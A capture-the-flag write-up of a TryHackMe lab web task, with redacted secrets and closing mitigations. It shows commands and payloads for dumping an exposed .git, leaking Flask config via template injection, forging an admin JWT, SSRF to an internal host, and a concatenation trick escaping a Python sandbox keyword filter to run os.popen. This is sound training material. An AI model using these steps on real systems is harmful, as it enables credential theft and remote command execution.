<!-- frontmatter: {
    "title":"Love at First Breach 2026 - Advanced Track: Task 5",
    "date":"2026-02-15",
    "platform":"TryHackMe",
    "event":"Love at First Breach 2026 - Advanced Track",
    "category":"Web",
    "difficulty":"Hard",
    "tags":["ssti","jwt","ssrf","python builtins"],
    "summary":"Leaked Flask config via a guarded SSTI, forged a JWT for admin access, pivoted through SSRF into an internal Python sandbox, then bypassed keyword filtering to read internal files.",
    "image":""
} -->

# Task 5 - Love at First Breach 2026 (Advanced Track)

This writeup covers Task 5 of the Love at First Breach 2026 Advanced Track. Sensitive secrets and flags are redacted.

## TL;DR

- **Entry:** Guarded SSTI on `/contact` leaked Flask config.
- **Execution:** Forged a JWT using the leaked admin secret and sent it as a cookie.
- **PrivEsc:** SSRF to `internal.nova.thm` exposed a Python sandbox; bypassed keyword filters via `globals()` + string concatenation.

---

## Recon

### Content discovery

```bash
ffuf -u http://nova.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
.gitignore              [Status: 200, Size: 35, Words: 1, Lines: 5, Duration: 42ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 34ms]
.git/index              [Status: 200, Size: 153, Words: 2, Lines: 2, Duration: 42ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 36ms]
about                   [Status: 200, Size: 2632, Words: 216, Lines: 149, Duration: 52ms]
admin                   [Status: 302, Size: 211, Words: 18, Lines: 6, Duration: 85ms]
contact                 [Status: 200, Size: 2146, Words: 168, Lines: 131, Duration: 64ms]
services                [Status: 200, Size: 2840, Words: 197, Lines: 149, Duration: 55ms]
```

Git repo is on the web app; the recovered dump only contained `preview_feature.py`.

### Git dumper 
Using [git-dumper](https://github.com/arthaud/git-dumper)
```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip install -r requirements.txt
./git_dumper.py http://nova.thm/.git ../findings
```

---

## Vulnerability Analysis

`preview_feature.py`
```python
@app.route("/contact", methods=["GET", "POST"])
def contact():                                 
    if request.method == "POST":           
        message = request.form.get("message", "").strip()                                     

        # Security by Obscurity                                                               
        if message == "{{ config }}":          
            return render_template_string(    
                message,                       
                config=app.config              
            )
                                               
        # This escapes all text                
        safe_message = escape(message) 

        template = f"""     
        <h3>Thank you for your message</h3>    
        <div class="preview-box">
            {safe_message}                     
        </div>                                 
        """            

        return template   
                       
    return render_template("contact.html")
```

---

## Exploitation

```bash
curl http://nova.thm/contact -d 'message={{ config }}'
&lt;Config {..., &#39;DATABASE_URL&#39;: &#39;postgresql://app_user:[REDACTED]@db.internal:5432/novadev&#39;, &#39;REDIS_HOST&#39;: &#39;redis.internal&#39;, &#39;ADMIN_SECRET&#39;: &#39;[REDACTED]&#39;}&gt;
```
We found an interesting `ADMIN_SECRET`.

`/admin/login`
![](assets/admin_login_src.png)
The comments hint the server uses JWTs to authenticate users, so an admin JWT was built using the leaked `ADMIN_SECRET`.
Using `jwt-cli`, multiple claims were tested:
```python
claims = [
    {"user": "admin"},
    {"username": "admin"},
    {"role": "admin"},
    {"admin": True},
    {"is_admin": True},
]
COOKIE_NAMES = ["token", "jwt", "access_token", "session"]
```
Passing the token as `Authorization: Bearer` or cookies showed that:
`[cookie:token] {"role": "admin"}` gave access to the admin dashboard.

![](assets/admin_dashboard.png)
The dashboard allows URL fetch. Trying to fetch an IP returned:
```text
Digits are not allowed, we really like DNS!
```

The placeholder hinted internal DNS, so I enumerated vhosts:
```bash
task5 ffuf -u http://nova.thm/ -H "Host: FUZZ.nova.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 178
internal                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 31ms]
```

`internal.nova.thm` exposed an internal Python sandbox when accessed via SSRF.

---

## Privilege Escalation

![](assets/python_sandbox.png)

The sandbox blocked keywords like `import`, `open`, `read`, `dir`, `os`, and `__`, but `globals()` was allowed. That leaked a live `os` reference, and string concatenation avoided keyword filters:

```python
globals().get('o'+'s').popen('ls /')
```

This enabled command execution and file reads via `os.popen`, leading to the internal flag file.

---

## Notes / Mitigations

- Remove public access to `.git` and other sensitive metadata.
- Avoid config leaks in templates and remove debug-only shortcuts.
- Use a robust JWT validation flow with strong secret management.
- Restrict SSRF to an allowlist and block internal DNS ranges.
- Replace keyword filters with real sandbox isolation or containerization.
